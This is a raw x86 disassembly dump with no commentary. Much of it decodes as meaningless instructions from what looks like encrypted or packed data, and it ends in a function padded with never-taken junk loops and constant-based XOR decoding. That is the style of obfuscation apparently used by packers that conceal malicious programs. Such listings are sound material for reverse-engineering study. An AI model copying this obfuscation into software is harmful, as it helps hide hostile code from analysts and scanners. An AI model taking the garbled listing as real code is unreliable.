  408c7b:	and    DWORD PTR [ecx-0x496a0be9],0x29d6c6d7
  408c85:	mov    edx,edi
  408c87:	mov    ecx,0x62d261f2
  408c8c:	push   eax
  408c8d:	cli    
  408c8e:	xlat   BYTE PTR ds:[ebx]
  408c8f:	or     eax,0xddd98729
  408c94:	aaa    
  408c95:	lods   al,BYTE PTR ds:[esi]
  408c96:	mov    WORD PTR [eax],fs
  408c98:	jae    0x408c90
  408c9a:	jle    0x408cc8
  408c9c:	arpl   bp,si
  408c9e:	dec    ebx
  408c9f:	push   ebx
  408ca0:	add    BYTE PTR [eax+0x48ef65f5],0xee
  408ca7:	fldenv [ebx+0x9]
  408caa:	dec    eax
  408cab:	stos   DWORD PTR es:[edi],eax
  408cac:	xlat   BYTE PTR ds:[ebx]
  408cad:	mov    al,0xa9
  408caf:	push   ebx
  408cb0:	(bad)  
  408cb1:	in     al,dx
  408cb2:	daa    
  408cb3:	pushf  
  408cb4:	imul   esp,DWORD PTR [ebx-0x26],0xffffffdb
  408cb8:	jb     0x408c67
  408cba:	mov    ds:0x6711e119,al
  408cbf:	inc    esp
  408cc0:	or     eax,0xd81f4b79
  408cc5:	lods   eax,DWORD PTR ds:[esi]
  408cc6:	pop    esi
  408cc7:	std    
  408cc8:	and    BYTE PTR [eax],ch
  408cca:	loope  0x408c8b
  408ccc:	sbb    BYTE PTR [eax],cl
  408cce:	sub    dh,BYTE PTR [edi+0xb]
  408cd1:	jmp    0x408c6d
  408cd3:	or     BYTE PTR [edi-0x3c0650c5],dl
  408cd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cda:	and    BYTE PTR [esi+0x29ffbc67],ah
  408ce0:	mov    al,cs:0x98ec2182
  408ce6:	in     al,0x82
  408ce8:	ja     0x408c7f
  408cea:	sbb    DWORD PTR [eax+0x72],0xbfbdcfcf
  408cf1:	jae    0x408ccd
  408cf3:	jns    0xf75bcf61
  408cf9:	int3   
  408cfa:	mov    esi,0x8674bfee
  408cff:	push   edx
  408d00:	push   ds
  408d01:	push   edx
  408d02:	and    BYTE PTR [edi+0x72397bc9],al
  408d08:	mov    ah,0xf8
  408d0a:	inc    edi
  408d0b:	leave  
  408d0c:	ret    
  408d0d:	in     al,0xae
  408d0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d10:	or     dh,ah
  408d12:	or     dh,0xce
  408d15:	adc    DWORD PTR [esi-0x7b],ebp
  408d18:	dec    eax
  408d19:	clc    
  408d1a:	dec    DWORD PTR [edx]
  408d1c:	das    
  408d1d:	dec    edx
  408d1e:	lahf   
  408d1f:	push   ds
  408d20:	cdq    
  408d21:	je     0x408d45
  408d23:	and    DWORD PTR [eax-0x3aac193e],ebp
  408d29:	cmp    eax,0xa905a1b
  408d2e:	stos   BYTE PTR es:[edi],al
  408d2f:	xor    DWORD PTR [edx+0x21],ebx
  408d32:	ins    BYTE PTR es:[edi],dx
  408d33:	add    al,0xf0
  408d35:	pop    ecx
  408d36:	push   0xf9c3e15a
  408d3b:	inc    ebp
  408d3c:	call   0xda635b41
  408d41:	out    0xe8,eax
  408d43:	test   DWORD PTR [ebp+0x176f426b],esp
  408d49:	data16 aas 
  408d4b:	jmp    0x6ba5:0x83ee81d3
  408d52:	push   ds
  408d53:	in     al,dx
  408d54:	in     eax,0x16
  408d56:	aas    
  408d57:	ret    0x3403
  408d5a:	jo     0x408dbb
  408d5c:	sbb    al,0x9
  408d5e:	mov    ch,0x76
  408d60:	push   cs
  408d61:	scas   al,BYTE PTR es:[edi]
  408d62:	into   
  408d63:	mov    ds:0x3c07e0af,eax
  408d68:	out    0x82,eax
  408d6a:	out    dx,al
  408d6b:	pushf  
  408d6c:	sub    dh,bl
  408d6e:	icebp  
  408d6f:	sub    edi,ebp
  408d71:	xchg   ecx,eax
  408d72:	out    0x78,al
  408d74:	and    cl,BYTE PTR [ecx-0x28fc27e9]
  408d7a:	mov    edi,DWORD PTR [ebp-0x8]
  408d7d:	lea    edx,[edx+edi*1+0x32729b]
  408d84:	mov    DWORD PTR [ebp-0x8],edx
  408d87:	mov    edx,DWORD PTR [ebp-0x20]
  408d8a:	xor    edx,eax
  408d8c:	mov    edi,0xffcd8d65
  408d91:	sub    edi,edx
  408d93:	add    edi,DWORD PTR [ebp-0x10]
  408d96:	mov    edx,DWORD PTR [ebp-0x20]
  408d99:	jmp    0x408f4a
  408d9e:	adc    BYTE PTR [esi],cl
  408da0:	das    
  408da1:	test   eax,0xb790a931
  408da6:	xor    al,0xa9
  408da8:	mov    ch,0xa
  408daa:	dec    esp
  408dab:	xor    al,0x86
  408dad:	jns    0x408d60
  408daf:	sar    DWORD PTR [esi+0x7e],1
  408db2:	mov    bh,BYTE PTR [edi+0x7e]
  408db5:	jle    0x408d8a
  408db7:	pop    edi
  408db8:	adc    edx,DWORD PTR [edi-0x23]
  408dbb:	and    DWORD PTR [edx],edx
  408dbd:	sub    al,BYTE PTR [ebx-0x23]
  408dc0:	mov    WORD PTR [ebx],ds
  408dc2:	stos   DWORD PTR es:[edi],eax
  408dc3:	sub    eax,0xd994046
  408dc8:	mov    ds:0x52808e2,al
  408dcd:	popf   
  408dce:	cli    
  408dcf:	lahf   
  408dd0:	jae    0x408e4c
  408dd2:	out    0x78,eax
  408dd4:	or     dh,BYTE PTR [ebp-0x3976daea]
  408dda:	xor    eax,0xad7d8c3c
  408ddf:	in     al,0xab
  408de1:	(bad)
  408de4:	dec    esp
  408de5:	pop    ecx
  408de6:	push   0xfffffffa
  408de8:	hlt    
  408de9:	aam    0x68
  408deb:	ds ja  0x408e69
  408dee:	pop    ebx
  408def:	aas    
  408df0:	xor    DWORD PTR [ecx+ecx*1+0x12],0xffffffb5
  408df5:	test   al,0xce
  408df7:	dec    ebx
  408df8:	push   edx
  408df9:	xchg   edi,eax
  408dfa:	pop    edx
  408dfb:	or     ah,BYTE PTR [ebx]
  408dfd:	mov    al,BYTE PTR [edx-0x2d40ce94]
  408e03:	xlat   BYTE PTR ds:[ebx]
  408e04:	inc    esi
  408e05:	jbe    0x408e18
  408e07:	(bad)  
  408e09:	cwde   
  408e0a:	shr    bl,cl
  408e0c:	dec    edx
  408e0d:	pushf  
  408e0e:	fadd   st(7),st
  408e10:	sub    DWORD PTR [edx-0x630ef387],0x1a
  408e17:	out    dx,al
  408e18:	adc    BYTE PTR [ecx+ebx*8-0x62],dh
  408e1c:	out    dx,eax
  408e1d:	adc    eax,0x2c42e029
  408e22:	ds icebp 
  408e24:	or     BYTE PTR [eax-0x60],dl
  408e27:	ret    
  408e28:	sbb    BYTE PTR es:[ebx+0x3b],bl
  408e2c:	xor    eax,0x7bee29a2
  408e31:	in     eax,0x6f
  408e33:	jno    0x408e4a
  408e35:	and    eax,ecx
  408e37:	shl    bl,cl
  408e39:	test   al,0x98
  408e3b:	push   eax
  408e3c:	sbb    BYTE PTR [esi+esi*1+0x60263f9e],bh
  408e43:	aaa    
  408e44:	mov    eax,ds:0x2a0851ee
  408e49:	and    DWORD PTR [eax],ebp
  408e4b:	(bad)  
  408e4c:	xchg   esi,eax
  408e4d:	fwait
  408e4e:	and    DWORD PTR [bx+si-0xa15],edi
  408e53:	lods   eax,DWORD PTR ds:[esi]
  408e54:	test   BYTE PTR [edi+0x21],0xf4
  408e58:	xchg   esp,eax
  408e59:	push   ebp
  408e5a:	jmp    0x8a49b19f
  408e5f:	lods   eax,DWORD PTR ds:[esi]
  408e60:	aad    0xb8
  408e62:	stos   BYTE PTR es:[edi],al
  408e63:	mov    al,0xa9
  408e65:	and    DWORD PTR [ebx+0x70],esi
  408e68:	jne    0x408e0d
  408e6a:	scas   eax,DWORD PTR es:[edi]
  408e6b:	mov    ds:0xc31c41ff,eax
  408e70:	or     al,0xb1
  408e72:	mov    WORD PTR [ecx-0x7e],ds
  408e75:	dec    edi
  408e76:	(bad)  
  408e77:	xor    ecx,DWORD PTR [eax]
  408e79:	xchg   esi,eax
  408e7a:	cld    
  408e7b:	jbe    0x408e59
  408e7d:	lds    esp,FWORD PTR [edi+0x18594a73]
  408e83:	or     DWORD PTR ds:0xdbd0547f,edi
  408e89:	dec    ecx
  408e8a:	bound  edi,QWORD PTR [ebx+esi*8-0x122f6d85]
  408e91:	shr    ch,1
  408e93:	fcom   DWORD PTR [edi]
  408e95:	jg     0x408e91
  408e97:	jge    0x408e92
  408e99:	cld    
  408e9a:	in     al,dx
  408e9b:	sbb    ch,bh
  408e9d:	icebp  
  408e9e:	cmc    
  408e9f:	or     eax,0x435d238a
  408ea4:	xor    ch,dl
  408ea6:	jecxz  0x408e90
  408ea8:	jp     0x408e47
  408eaa:	call   0x9f2887b
  408eaf:	pop    ebx
  408eb0:	sbb    DWORD PTR [edi-0x33],edx
  408eb3:	sti    
  408eb4:	cdq    
  408eb5:	sbb    eax,DWORD PTR [ebx-0x7c]
  408eb8:	and    dh,BYTE PTR [eax]
  408eba:	fdiv   st(3),st
  408ebc:	xchg   edx,eax
  408ebd:	js     0x408ee5
  408ebf:	jne    0x408ef0
  408ec1:	cdq    
  408ec2:	das    
  408ec3:	and    eax,0x5739fe25
  408ec8:	es mov dh,0x6d
  408ecb:	jp     0x408f15
  408ecd:	inc    esi
  408ece:	fistp  QWORD PTR [ecx]
  408ed0:	fs push edx
  408ed2:	fbld   TBYTE PTR [esi-0x4c]
  408ed5:	sbb    al,0x1
  408ed7:	lock repz js 0x408ec7
  408edb:	xchg   esp,eax
  408edc:	sbb    DWORD PTR [esi],0xbf9f66ff
  408ee2:	kmovb  k4,k0
  408ee6:	leave  
  408ee7:	sub    BYTE PTR [edx-0x92d5d6a],al
  408eed:	cli    
  408eee:	pop    esi
  408eef:	push   ss
  408ef0:	mov    DWORD PTR [edi+eiz*8+0x9],ebp
  408ef4:	test   al,0x44
  408ef6:	test   al,0x2b
  408ef8:	std    
  408ef9:	ret    0x9ba9
  408efc:	shl    DWORD PTR [esi-0x423f6c5d],1
  408f02:	fisttp WORD PTR ss:0xb665e6b5
  408f09:	pop    edi
  408f0a:	mov    DWORD PTR [edi+0x27ca6a90],eax
  408f10:	(bad)  
  408f12:	mov    ecx,0xf464b77e
  408f17:	nop
  408f18:	jnp    0x408f5b
  408f1a:	js     0x408f52
  408f1c:	mov    dl,0xf2
  408f1e:	jns    0x408f87
  408f20:	retf   0x5529
  408f23:	mov    ss,WORD PTR fs:[edi-0xa]
  408f27:	hlt    
  408f28:	fst    QWORD PTR [edi+0x17b4eaab]
  408f2e:	call   0xc125:0xa6bd40fe
  408f35:	shl    BYTE PTR [esi-0x3b],1
  408f38:	mov    BYTE PTR [edx],cl
  408f3a:	adc    edx,DWORD PTR [ebp-0x2d]
  408f3d:	sbb    DWORD PTR [edi-0x3a201cb0],ebp
  408f43:	cmp    al,BYTE PTR [eax]
  408f45:	cmp    al,BYTE PTR [edx-0x74aa8c39]
  408f4b:	pop    ebp
  408f4c:	clc    
  408f4d:	xor    edx,eax
  408f4f:	jmp    0x409100
  408f54:	or     al,0x6
  408f56:	addr16 into 
  408f58:	jne    0x408fc9
  408f5a:	mov    ch,0xc4
  408f5c:	mov    dl,0x4d
  408f5e:	(bad)  
  408f60:	add    ebp,ecx
  408f62:	and    BYTE PTR [ebp+0x7e7edfcd],ah
  408f68:	mov    bh,BYTE PTR [edi+0x7e]
  408f6b:	jle    0x408eff
  408f6d:	adc    al,0x4f
  408f6f:	push   esi
  408f70:	sbb    esp,DWORD PTR [edx+0x43]
  408f73:	xor    ch,ah
  408f75:	sbb    DWORD PTR [edi-0x7630de08],ebp
  408f7b:	ins    BYTE PTR es:[edi],dx
  408f7c:	add    edx,ebx
  408f7e:	inc    eax
  408f7f:	inc    ebx
  408f80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f81:	hlt    
  408f82:	mov    ecx,0x291b2023
  408f87:	div    DWORD PTR [esi+0x63]
  408f8a:	ds call 0xfa91:0x664dd4ca
  408f92:	pop    edi
  408f93:	push   0x163fe3f2
  408f98:	js     0x409005
  408f9a:	mov    edx,0x6ef3e915
  408f9f:	lods   al,BYTE PTR ds:[esi]
  408fa0:	cs ds push 0xffffffcb
  408fa4:	add    DWORD PTR [ebx-0x5ec4eb3f],0xffffff88
  408fab:	cmp    DWORD PTR [edx-0x565015f],0x49907f73
  408fb5:	xor    bl,0x47
  408fb8:	mov    cs,WORD PTR ds:0x2bb69c8b
  408fbe:	jp     0x408f47
  408fc0:	es add al,0x76
  408fc3:	fstp   DWORD PTR [eax]
  408fc5:	outs   dx,BYTE PTR ds:[esi]
  408fc6:	mov    esp,0x8a65742
  408fcb:	or     BYTE PTR [eax+0xe],cl
  408fce:	loopne 0x409029
  408fd0:	fst    QWORD PTR ds:0x6bed0184
  408fd6:	bound  esi,QWORD PTR [eax+0x68]
  408fd9:	inc    ecx
  408fda:	push   ebp
  408fdb:	int    0xcc
  408fdd:	dec    edi
  408fde:	ss pop eax
  408fe0:	sti    
  408fe1:	mov    esi,0x7899bbed
  408fe6:	cmp    ch,ch
  408fe8:	inc    esp
  408fe9:	lods   al,BYTE PTR ds:[esi]
  408fea:	imul   esi,DWORD PTR [eax-0x42e01d7f],0x16
  408ff1:	pop    ebx
  408ff2:	mov    ebx,0x1654f0c3
  408ff7:	xor    ecx,DWORD PTR [ecx+0x601a209d]
  408ffd:	ins    BYTE PTR es:[edi],dx
  408ffe:	into   
  408fff:	shl    DWORD PTR [ebp+0x401e0893],1
  409005:	lea    edi,[ebp-0xb35dd71]
  40900b:	pusha  
  40900c:	xor    DWORD PTR [edx+0x49],ecx
  40900f:	ds ds hlt 
  409012:	jg     0x409020
  409014:	push   ebp
  409015:	dec    ebp
  409016:	xor    al,0x45
  409018:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409019:	shl    DWORD PTR [esi],cl
  40901b:	jg     0x409071
  40901d:	or     al,0xca
  40901f:	sti    
  409020:	push   eax
  409021:	ror    BYTE PTR [esp+esi*2],cl
  409024:	dec    esi
  409025:	ins    BYTE PTR es:[edi],dx
  409026:	add    edi,DWORD PTR [ecx+ebx*4]
  409029:	pushf  
  40902a:	lea    ecx,[esi-0x5754b5b7]
  409030:	icebp  
  409031:	cmp    BYTE PTR [eax],dl
  409033:	inc    esp
  409034:	push   ss
  409035:	sub    DWORD PTR [edi+0x5f624e8a],ecx
  40903b:	add    ebx,DWORD PTR [esp+eiz*2+0x16fa24cf]
  409042:	lea    ebp,[edx-0x23f0a7fb]
  409048:	push   edx
  409049:	dec    esi
  40904a:	push   edi
  40904b:	daa    
  40904c:	(bad)  
  40904d:	and    dh,BYTE PTR [edi-0x618cecd7]
  409053:	jg     0x409029
  409055:	sub    bh,al
  409057:	xchg   BYTE PTR [edi+0x142e9013],ch
  40905d:	sahf   
  40905e:	retf   
  40905f:	ss cld 
  409061:	bndldx bnd2,[ecx-0xbfb2562]
  409068:	fstp   QWORD PTR [esi+0x6fcc3819]
  40906e:	test   al,0xc6
  409070:	mov    ebx,0x3017d7c
  409075:	pop    ebp
  409076:	rol    esi,1
  409078:	js     0x409068
  40907a:	and    al,cl
  40907c:	mov    edx,DWORD PTR [eax-0x4f]
  40907f:	ret    0xf04c
  409082:	or     DWORD PTR [ebx],0x54
  409085:	iret   
  409086:	or     al,0x67
  409088:	daa    
  409089:	fist   WORD PTR [ebp+0x71]
  40908c:	fwait
  40908d:	pop    edi
  40908e:	(bad)  
  40908f:	sbb    DWORD PTR [ebx-0x2ad5f3e9],esi
  409095:	adc    BYTE PTR [ebp+0x7367200e],dh
  40909b:	inc    esp
  40909c:	lods   al,BYTE PTR ds:[esi]
  40909d:	mov    esi,0x7a0255e5
  4090a2:	mov    eax,0xcb83888f
  4090a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090a8:	nop
  4090a9:	fmul   DWORD PTR [edi+0x57c7bc50]
  4090af:	bound  ecx,QWORD PTR [esp+ecx*4]
  4090b2:	push   edi
  4090b3:	xchg   edi,eax
  4090b4:	xchg   esp,eax
  4090b5:	mov    bl,0x64
  4090b7:	push   cs
  4090b8:	repnz das 
  4090ba:	push   0xffffffe9
  4090bc:	mov    cl,0xb0
  4090be:	bound  ebp,QWORD PTR [ecx-0x16]
  4090c1:	xchg   BYTE PTR [ecx-0x7df39651],ch
  4090c7:	sub    esi,ebx
  4090c9:	test   BYTE PTR ds:0x2cefac4e,dl
  4090cf:	bound  edi,QWORD PTR [eax]
  4090d1:	jmp    0x409091
  4090d3:	imul   esp,DWORD PTR [edx],0xc03e2967
  4090d9:	mov    ecx,0x3b9ed502
  4090de:	jp     0x4090ac
  4090e0:	clc    
  4090e1:	sahf   
  4090e2:	into   
  4090e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090e4:	or     eax,0xd3001c07
  4090e9:	dec    ebx
  4090ea:	ins    BYTE PTR es:[edi],dx
  4090eb:	xor    bl,ch
  4090ed:	imul   esp,DWORD PTR [eax+0x67],0xb
  4090f1:	addr16 cwde 
  4090f3:	mov    bh,0x37
  4090f5:	scas   al,BYTE PTR es:[edi]
  4090f6:	test   al,0x48
  4090f8:	jle    0x4090df
  4090fa:	jnp    0x4090df
  4090fc:	inc    edi
  4090fd:	cmp    bl,0x9d
  409100:	add    edx,ecx
  409102:	imul   edx,ebx
  409105:	cmp    edx,edi
  409107:	jbe    0x407629
  40910d:	pop    ebx
  40910e:	pop    edi
  40910f:	leave  
  409110:	ret    0x8
  409113:	push   ebp
  409114:	mov    ebp,esp
  409116:	sub    esp,0x70
  409119:	call   DWORD PTR ds:0x42ea37
  40911f:	and    DWORD PTR ds:0x4304db,0x43043d
  409129:	xor    ecx,ecx
  40912b:	mov    DWORD PTR ds:0x42eddb,0x7bf5
  409135:	cmp    eax,0x86576545
  40913a:	mov    DWORD PTR ds:0x4304e3,0x7971
  409144:	jne    0x409304
  40914a:	cmp    ecx,0x9879
  409150:	mov    DWORD PTR ds:0x42e7d8,0x1505
  40915a:	jne    0x409304
  409160:	push   0x78776563
  409165:	call   DWORD PTR ds:0x42ea77
  40916b:	sbb    DWORD PTR ds:0x430441,0x430471
  409175:	push   0x8678976
  40917a:	or     DWORD PTR ds:0x42edcb,0x624a
  409184:	call   DWORD PTR ds:0x42ea3f
  40918a:	adc    DWORD PTR ds:0x42e7c0,0x43045d
  409194:	test   eax,eax
  409196:	je     0x4091ca
  40919c:	mov    DWORD PTR ds:0x430451,0x7d40
  4091a6:	push   0x87678768
  4091ab:	xor    DWORD PTR ds:0x430435,0x35ac
  4091b5:	push   0x86787676
  4091ba:	or     DWORD PTR ds:0x43046d,0x42e7d4
  4091c4:	call   DWORD PTR ds:0x42eae3
  4091ca:	push   ebx
  4091cb:	mov    ebx,0xf89c8531
  4091d0:	mov    ecx,DWORD PTR ds:0x42e7c8
  4091d6:	and    DWORD PTR ds:0x430459,ecx
  4091dc:	mov    DWORD PTR [ebp-0x8],ebx
  4091df:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4091e6:	adc    DWORD PTR ds:0x430439,edi
  4091ec:	lea    eax,[ebp-0x18]
  4091ef:	mov    DWORD PTR ds:0x42eddb,0x1a
  4091f9:	cmp    DWORD PTR ds:0x42eddb,0x0
  409200:	je     0x409235
  409206:	cmp    DWORD PTR ds:0x42eddb,0x25
  40920d:	jne    0x409219
  409213:	call   DWORD PTR ds:0x42e9e3
  409219:	mov    ecx,DWORD PTR ds:0x42eddb
  40921f:	dec    ecx
  409220:	mov    DWORD PTR ds:0x42eddb,ecx
  409226:	jmp    0x4091f9
  40922b:	sub    DWORD PTR ds:0x42ede3,0x62aa
  409235:	mov    DWORD PTR [ebp-0x14],eax
  409238:	lea    eax,[ebp-0x1c]
  40923b:	mov    DWORD PTR [ebp-0xc],eax
  40923e:	mov    eax,ds:0x42eddf
  409243:	sbb    eax,DWORD PTR ds:0x42eddb
  409249:	mov    ds:0x42eddf,eax
  40924e:	mov    eax,ds:0x4121a8
  409253:	mov    eax,DWORD PTR [eax+0x1c8]
  409259:	mov    eax,DWORD PTR [eax]
  40925b:	mov    ecx,DWORD PTR ds:0x42eddb
  409261:	and    DWORD PTR ds:0x42e7bc,ecx
  409267:	mov    ecx,DWORD PTR [ebp-0xc]
  40926a:	or     DWORD PTR ds:0x430455,0x4304d7
  409274:	push   esi
  409275:	add    DWORD PTR ds:0x42e7cc,edx
  40927b:	mov    esi,0x7510854
  409280:	adc    DWORD PTR ds:0x430455,0x7ea6
  40928a:	xor    eax,esi
  40928c:	or     DWORD PTR ds:0x42edcb,0x4304e7
  409296:	push   edi
  409297:	neg    edi
  409299:	mov    edi,0x32729b
  40929e:	sub    DWORD PTR ds:0x42edcb,0x2aac
  4092a8:	add    eax,edi
  4092aa:	mov    DWORD PTR ds:0x430449,0x4315
  4092b4:	mov    DWORD PTR [ecx],eax
  4092b6:	mov    eax,0x4350
  4092bb:	mov    eax,ds:0x4123c8
  4092c0:	cmp    eax,0x23c13046
  4092c5:	mov    eax,DWORD PTR [ebp-0x4]
  4092c8:	mov    DWORD PTR ds:0x430459,0x50bd
  4092d2:	je     0x409332
  4092d8:	and    DWORD PTR ds:0x42ede3,edx
  4092de:	mov    ecx,DWORD PTR [ebp-0x8]
  4092e1:	add    DWORD PTR ds:0x42e7c8,0x3ec0
  4092eb:	xor    eax,esi
  4092ed:	add    eax,edi
  4092ef:	or     DWORD PTR ds:0x430435,0x6771
  4092f9:	imul   eax,ecx
  4092fc:	mov    DWORD PTR [ebp-0x8],eax
  4092ff:	jmp    0x409535
  409304:	push   0x4122bc
  409309:	call   DWORD PTR ds:0x42e9ff
  40930f:	adc    DWORD PTR ds:0x42eddf,0x42e7cc
  409319:	test   eax,eax
  40931b:	je     0x4091ca
  409321:	xor    eax,eax
  409323:	mov    DWORD PTR ds:0x430455,0x3bf5
  40932d:	jmp    0x4098b3
  409332:	xor    eax,esi
  409334:	and    DWORD PTR ds:0x430451,0x0
  40933e:	jmp    0x409352
  409343:	xor    ecx,ecx
  409345:	or     ecx,DWORD PTR ds:0x430451
  40934b:	inc    ecx
  40934c:	mov    DWORD PTR ds:0x430451,ecx
  409352:	cmp    DWORD PTR ds:0x430451,0x1d
  409359:	jae    0x40939a
  40935f:	cmp    DWORD PTR ds:0x430451,0xc
  409366:	jne    0x409375
  40936c:	push   DWORD PTR [ebp-0x18]
  40936f:	call   DWORD PTR ds:0x42e9e7
  409375:	cmp    DWORD PTR ds:0x430451,0xb
  40937c:	jne    0x40938f
  409382:	mov    ecx,DWORD PTR ds:0x430451
  409388:	inc    ecx
  409389:	mov    DWORD PTR ds:0x430451,ecx
  40938f:	jmp    0x409343
  409394:	or     ecx,DWORD PTR ds:0x42edcb
  40939a:	add    eax,edi
  40939c:	mov    ecx,DWORD PTR ds:0x42e967
  4093a2:	mov    ecx,DWORD PTR [ecx]
  4093a4:	adc    DWORD PTR ds:0x4304d3,ecx
  4093aa:	mov    ds:0x4122b8,eax
  4093af:	mov    DWORD PTR ds:0x4304eb,0x17
  4093b9:	cmp    DWORD PTR ds:0x4304eb,0x0
  4093c0:	je     0x409450
  4093c6:	cmp    DWORD PTR ds:0x4304eb,0x3
  4093cd:	jne    0x4093df
  4093d3:	push   DWORD PTR [ebp-0x1c]
  4093d6:	push   DWORD PTR [ebp-0x24]
  4093d9:	call   DWORD PTR ds:0x42e9eb
  4093df:	cmp    DWORD PTR ds:0x4304eb,0x4
  4093e6:	jne    0x4093f9
  4093ec:	mov    ecx,DWORD PTR ds:0x4304eb
  4093f2:	dec    ecx
  4093f3:	mov    DWORD PTR ds:0x4304eb,ecx
  4093f9:	mov    ecx,DWORD PTR ds:0x4304eb
  4093ff:	dec    ecx
  409400:	mov    DWORD PTR ds:0x4304eb,ecx
  409406:	jmp    0x4093b9
  40940b:	mov    DWORD PTR ds:0x4304df,0x10
  409415:	cmp    DWORD PTR ds:0x4304df,0x0
  40941c:	je     0x409450
  409422:	cmp    DWORD PTR ds:0x4304df,0x1a
  409429:	jne    0x409438
  40942f:	push   DWORD PTR [ebp-0x10]
  409432:	call   DWORD PTR ds:0x42e9ef
  409438:	mov    ecx,DWORD PTR ds:0x4304df
  40943e:	dec    ecx
  40943f:	mov    DWORD PTR ds:0x4304df,ecx
  409445:	jmp    0x409415
  40944a:	not    DWORD PTR ds:0x430461
  409450:	mov    eax,DWORD PTR [ebp-0x8]
  409453:	xor    eax,esi
  409455:	add    eax,edi
  409457:	mov    DWORD PTR ds:0x430469,0x16
  409461:	cmp    DWORD PTR ds:0x430469,0x0
  409468:	je     0x409493
  40946e:	cmp    DWORD PTR ds:0x430469,0x25
  409475:	jne    0x409481
  40947b:	call   DWORD PTR ds:0x42e9f3
  409481:	mov    ecx,DWORD PTR ds:0x430469
  409487:	dec    ecx
  409488:	mov    DWORD PTR ds:0x430469,ecx
  40948e:	jmp    0x409461
  409493:	mov    ds:0x4123c8,eax
  409498:	mov    eax,DWORD PTR [ebp-0x4]
  40949b:	and    DWORD PTR ds:0x42edcf,0x0
  4094a5:	jmp    0x4094b7
  4094aa:	mov    ecx,DWORD PTR ds:0x42edcf
  4094b0:	inc    ecx
  4094b1:	mov    DWORD PTR ds:0x42edcf,ecx
  4094b7:	cmp    DWORD PTR ds:0x42edcf,0x13
  4094be:	jae    0x4094e6
  4094c4:	cmp    DWORD PTR ds:0x42edcf,0x21
  4094cb:	jne    0x4094e1
  4094d1:	push   0x42e8fb
  4094d6:	push   0x42e8a5
  4094db:	call   DWORD PTR ds:0x42ec2b
  4094e1:	jmp    0x4094aa
  4094e6:	mov    ecx,DWORD PTR ds:0x4122b8
  4094ec:	xor    eax,esi
  4094ee:	add    DWORD PTR ds:0x430451,0x1a56
  4094f8:	add    eax,edi
  4094fa:	mov    DWORD PTR ds:0x4304eb,0x68f3
  409504:	cmp    ecx,eax
  409506:	mov    DWORD PTR ds:0x42ede3,0x3c82
  409510:	jne    0x409535
  409516:	sbb    DWORD PTR ds:0x430469,0x89e
  409520:	push   DWORD PTR [ebp-0x4]
  409523:	push   DWORD PTR [ebp-0x8]
  409526:	sbb    DWORD PTR ds:0x4304e3,0x430471
  409530:	call   0x4098b7
  409535:	mov    DWORD PTR ds:0x430439,0x1e
  40953f:	cmp    DWORD PTR ds:0x430439,0x0
  409546:	je     0x40958c
  40954c:	cmp    DWORD PTR ds:0x430439,0x25
  409553:	jne    0x40956c
  409559:	push   0x7778
  40955e:	push   DWORD PTR [ebp-0x14]
  409561:	push   0x42e7dc
  409566:	call   DWORD PTR ds:0x42e9f7
  40956c:	mov    eax,ds:0x430439
  409571:	dec    eax
  409572:	mov    ds:0x430439,eax
  409577:	jmp    0x40953f
  40957c:	mov    edx,DWORD PTR ds:0x430489
  409582:	mov    eax,ds:0x430513
  409587:	sub    edx,eax
  409589:	add    edx,DWORD PTR [edx+eax*1]
  40958c:	mov    eax,ds:0x4121a8
  409591:	mov    eax,DWORD PTR [eax+0x18c]
  409597:	xor    DWORD PTR ds:0x4304cf,0x75b9
  4095a1:	mov    eax,DWORD PTR [eax]
  4095a3:	sub    edx,0xc40
  4095a9:	mov    DWORD PTR [ebp-0x20],eax
  4095ac:	mov    eax,0xf89c853d
  4095b1:	xor    DWORD PTR ds:0x42e7d8,ecx
  4095b7:	mov    DWORD PTR [ebp-0x24],eax
  4095ba:	mov    DWORD PTR [ebp-0x24],eax
  4095bd:	add    edx,edx
  4095bf:	mov    DWORD PTR [ebp-0x24],eax
  4095c2:	mov    DWORD PTR [ebp-0xc],ebx
  4095c5:	mov    DWORD PTR [ebp-0x24],eax
  4095c8:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  4095cf:	and    DWORD PTR ds:0x430441,0x0
  4095d9:	xor    edx,edx
  4095db:	or     edx,DWORD PTR ds:0x430441
  4095e1:	inc    edx
  4095e2:	mov    DWORD PTR ds:0x430441,edx
  4095e8:	cmp    DWORD PTR ds:0x430441,0x23
  4095ef:	jne    0x40961d
  4095f5:	push   0x4d80
  4095fa:	push   DWORD PTR [ebp-0x14]
  4095fd:	push   0x820d
  409602:	push   DWORD PTR [ebp-0x14]
  409605:	push   DWORD PTR [ebp-0x1c]
  409608:	push   0x20d9
  40960d:	push   0x48e2
  409612:	push   0x42e8cd
  409617:	call   DWORD PTR ds:0x42e9fb
  40961d:	cmp    DWORD PTR ds:0x430441,0x1f
  409624:	jb     0x4095d9
  40962a:	add    ecx,0x11fe
  409630:	mov    ebx,DWORD PTR [ebp-0x8]
  409633:	and    DWORD PTR ds:0x42e7c8,0x0
  40963d:	mov    ecx,DWORD PTR ds:0x42e7c8
  409643:	inc    ecx
  409644:	mov    DWORD PTR ds:0x42e7c8,ecx
  40964a:	cmp    DWORD PTR ds:0x42e7c8,0x16
  409651:	jne    0x409672
  409657:	push   DWORD PTR [ebp-0xc]
  40965a:	push   DWORD PTR [ebp-0x14]
  40965d:	push   0x8989
  409662:	push   0x2c01
  409667:	push   0x2fc9
  40966c:	call   DWORD PTR ds:0x42ec2f
  409672:	cmp    DWORD PTR ds:0x42e7c8,0x14
  409679:	jb     0x40963d
  40967f:	mov    ecx,DWORD PTR [ebp-0x4]
  409682:	mov    edx,DWORD PTR [ebp-0x4]
  409685:	xor    edx,esi
  409687:	xor    ecx,esi
  409689:	add    ecx,edx
  40968b:	mov    edx,DWORD PTR [ebp-0x4]
  40968e:	xor    ebx,esi
  409690:	xor    edx,esi
  409692:	add    ebx,edi
  409694:	lea    ecx,[ecx+edx*1+0x9757d1]
  40969b:	cmp    ebx,ecx
  40969d:	ja     0x4096fe
  4096a3:	mov    eax,DWORD PTR [ebp-0x4]
  4096a6:	xor    eax,esi
  4096a8:	lea    eax,[eax+ebx*1+0x32729b]
  4096af:	push   eax
  4096b0:	mov    eax,DWORD PTR [ebp-0xc]
